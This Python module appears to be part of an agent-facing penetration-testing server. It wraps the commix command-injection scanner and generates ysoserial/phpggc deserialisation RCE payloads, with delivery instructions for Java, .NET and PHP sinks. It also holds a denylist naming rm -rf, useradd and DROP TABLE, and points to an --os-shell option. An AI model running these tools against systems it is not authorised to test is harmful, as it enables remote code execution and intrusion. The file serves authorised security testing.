"""Vuln scanners cont.: commix, ysoserial deserialization gadget (split from _g1)."""

from mcp.server.fastmcp import FastMCP
from ._shared import (
    BURP_PROXY_URL,
    _USER_AGENT,
    _check_tool,
    _run_cmd,
    json,
    wrap_untrusted,
)


def register(mcp: FastMCP):
    @mcp.tool()
    async def run_commix(
        target: str,
        data: str = "",
        cookie: str = "",
        parameter: str = "",
        level: int = 1,
        technique: str = "",
        batch: bool = True,
        use_proxy: bool = True,
        timeout: int = 600,
    ) -> str:
        """Run commix command-injection scanner against a target. Requires commix installed.

        commix is the sqlmap-equivalent for OS-command injection — confirms
        injection AND offers `--os-shell` interactive mode. This wrapper runs
        DETECTION + confirmation only (no shell spawn — operator opts in
        manually). Routes through Burp proxy by default.

        Args:
            target: Target URL (with vulnerable parameter)
            data: POST body (auto-switches to POST)
            cookie: Cookie header
            parameter: Restrict tests to a single parameter (-p)
            level: Test level 1-3 (default 1)
            technique: c=classic, e=eval, t=time, f=file. Empty = all.
            batch: Non-interactive (default True)
            use_proxy: Route through Burp proxy (default True)
            timeout: Max seconds (default 600)
        """
        if not _check_tool("commix"):
            return (
                "Error: commix not installed.\n"
                "  pip install commix  OR  git clone https://github.com/commixproject/commix\n"
                "  https://github.com/commixproject/commix"
            )

        cmd = [
            "commix", "--url", target,
            "--level", str(max(1, min(3, level))),
            "--skip-waf",
        ]
        if data:
            cmd.extend(["--data", data])
        if cookie:
            cmd.extend(["--cookie", cookie])
        if parameter:
            cmd.extend(["-p", parameter])
        if technique:
            cmd.extend(["--technique", technique])
        if batch:
            cmd.append("--batch")
        if use_proxy:
            cmd.extend(["--proxy", BURP_PROXY_URL])

        stdout, stderr, code = await _run_cmd(cmd, timeout)
        out = (stdout + "\n" + stderr).strip()
        if not out:
            return f"commix produced no output (exit {code})"

        key_lines = []
        for line in out.split("\n"):
            if any(k in line for k in (
                "injectable", "vulnerable", "injection", "Type:", "Technique:",
                "Payload:", "Parameter:", "[+] ", "[!] ", "[CRITICAL]", "[ERROR]",
            )):
                key_lines.append(line.strip())

        lines = [f"commix findings for {target} ({len(key_lines)}):", ""]
        if key_lines:
            for l in key_lines[:80]:
                lines.append(f"  {l}")
        else:
            lines.append(f"  No injection found at level={level}. Try higher level or specify technique=eft.")

        lines.append("")
        lines.append("Next steps:")
        lines.append("  - Confirm with: confirm_rce(endpoint=TARGET, parameter=PARAM, command='id')")
        lines.append("  - For interactive shell (operator-supervised, SOC-loud): re-run with `--os-shell` via curl_request/send_raw_request")
        if use_proxy:
            lines.append("All requests routed through Burp proxy — check proxy history.")
        return "\n".join(lines)

    @mcp.tool()
    async def generate_deserialization_gadget(
        language: str,
        gadget: str = "",
        command: str = "id",
        encode: str = "base64",
        timeout: int = 60,
    ) -> str:
        """Generate a deserialization gadget chain via ysoserial / ysoserial.net / phpggc.

        Payload GENERATOR only — does NOT send. Operator pipes the output into
        curl_request / send_raw_request / session_request via the vulnerable
        sink (Java ObjectInputStream, .NET BinaryFormatter, PHP unserialize,
        etc.). Per Rule 5 and the confirm_* safety contract, `command` is
        filtered against the HARD_DESTRUCTIVE denylist (rm -rf, useradd,
        DROP TABLE blocked).

        Args:
            language: java | dotnet | php
            gadget: Java: CommonsCollections1..7, Spring1, Spring2, ROME,
                Hibernate1..2, etc. .NET: TypeConfuseDelegate,
                ActivitySurrogateSelector, WindowsIdentity, etc. PHP (phpggc
                chain names): Laravel/RCE1, Symfony/RCE4, Monolog/RCE1,
                Guzzle/RCE1, WordPress/RCE1, etc. — run `phpggc -l`.
                Empty = print available gadget list.
            command: Command for the gadget to run on deserialize. Default 'id'.
                PHP RCE chains run it via `system` (phpggc <chain> system <cmd>).
                HARD_DESTRUCTIVE patterns refused at tool layer.
            encode: base64 | raw | hex (default base64)
            timeout: Max seconds for the generator process (default 60)
        """
        from praetor.tools.exploit._safety import (
            soc_loud_warning,
            validate_payload,
        )

        lang = language.lower().strip()
        if lang not in {"java", "dotnet", ".net", "php"}:
            return f"Unknown language '{language}'. Use 'java', 'dotnet', or 'php'."
        if lang == ".net":
            lang = "dotnet"

        ok, why = validate_payload(command, vuln_type="deserialization")
        if not ok:
            return f"REFUSED: {why}"
        warning = soc_loud_warning(command)

        if lang == "java":
            tool = "ysoserial"
            jar = "ysoserial.jar"
            if not _check_tool("ysoserial") and not _check_tool("java"):
                return (
                    "Error: ysoserial not installed.\n"
                    "  Download: https://github.com/frohoff/ysoserial/releases\n"
                    "  Then alias `ysoserial='java -jar /path/to/ysoserial.jar'`"
                )
            if not gadget:
                cmd = ["ysoserial"] if _check_tool("ysoserial") else ["java", "-jar", jar]
            else:
                base = ["ysoserial"] if _check_tool("ysoserial") else ["java", "-jar", jar]
                cmd = base + [gadget, command]
        elif lang == "php":
            tool = "phpggc"
            if not _check_tool("phpggc") and not _check_tool("php"):
                return (
                    "Error: phpggc not installed.\n"
                    "  git clone https://github.com/ambionics/phpggc\n"
                    "  Then symlink `phpggc` into PATH, or run from its dir.\n"
                    "  https://github.com/ambionics/phpggc"
                )
            base = ["phpggc"] if _check_tool("phpggc") else ["php", "phpggc"]
            if not gadget:
                cmd = base + ["-l"]
            else:
                # phpggc RCE chains take <function> <arg>; `system` runs command.
                cmd = base + [gadget, "system", command]
        else:  # dotnet
            if not _check_tool("ysoserial.exe") and not _check_tool("ysoserial.net"):
                return (
                    "Error: ysoserial.net not installed.\n"
                    "  Download: https://github.com/pwntester/ysoserial.net/releases\n"
                    "  Add to PATH as `ysoserial.exe` (Windows) or `ysoserial.net` (Linux wrapper)."
                )
            tool = "ysoserial.exe" if _check_tool("ysoserial.exe") else "ysoserial.net"
            if not gadget:
                cmd = [tool]
            else:
                cmd = [tool, "-g", gadget, "-c", command, "-f", "BinaryFormatter"]

        stdout, stderr, code = await _run_cmd(cmd, timeout)
        out = (stdout + "\n" + stderr).strip()
        if not out:
            return f"{tool} produced no output (exit {code})"

        # If no gadget specified, return the available-gadgets list verbatim
        if not gadget:
            lines = [f"{tool} available gadgets:", ""]
            for line in out.splitlines()[:80]:
                lines.append(f"  {line}")
            lines.append("")
            lines.append("Re-run with gadget=<name> command='id' to generate.")
            return "\n".join(lines)

        # Otherwise the output IS the raw serialized payload. Encode.
        raw_bytes = stdout.encode("latin-1", errors="ignore") if isinstance(stdout, str) else stdout
        import base64 as _b64
        if encode == "base64":
            payload_str = _b64.b64encode(raw_bytes).decode()
        elif encode == "hex":
            payload_str = raw_bytes.hex()
        else:
            payload_str = stdout  # raw

        lines = [
            f"{tool} gadget={gadget} command={command!r} ({len(raw_bytes)} bytes, {encode}):",
        ]
        if warning:
            lines.append(f"  warning: {warning}")
        lines.append("")
        lines.append("Payload:")
        # Wrap at 100 chars/line for readability
        for i in range(0, len(payload_str), 100):
            lines.append(payload_str[i:i + 100])
        lines.append("")
        lines.append("Delivery:")
        lines.append("  - Java: POST as body to ObjectInputStream sink, or stuff into a")
        lines.append("    Cookie / Header value the app deserialises")
        lines.append("  - .NET: BinaryFormatter / NetDataContractSerializer / LosFormatter sink")
        lines.append("  - PHP: feed into the unserialize() sink — cookie / hidden field / body")
        lines.append("    the app passes to unserialize(); url-encode if the sink is a GET/POST param")
        lines.append("  - Verify exec via confirm_rce() with use_collaborator=True if response is opaque")
        if stderr:
            lines.append("")
            lines.append(f"stderr (first 400 chars): {stderr[:400]}")
        return "\n".join(lines)
